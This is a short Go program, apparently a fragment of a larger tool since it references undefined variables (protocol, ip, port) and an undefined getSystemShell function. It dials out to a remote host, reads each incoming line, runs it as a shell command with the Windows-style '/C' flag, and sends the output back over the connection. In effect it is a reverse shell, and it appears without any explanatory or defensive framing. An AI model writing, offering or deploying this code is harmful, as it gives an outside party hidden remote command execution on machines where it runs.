package main

import (
	"os/exec"
)
import "net"
import "bufio"

func main() {
	c, _ := net.Dial(protocol, ip+":"+port)
	prompt := getSystemShell()
	for {
		status, _ := bufio.NewReader(c).ReadString('\n')
		cmd := exec.Command(prompt, "/C", status)
		out, _ := cmd.Output()
		_, _ = c.Write(out)
	}
}
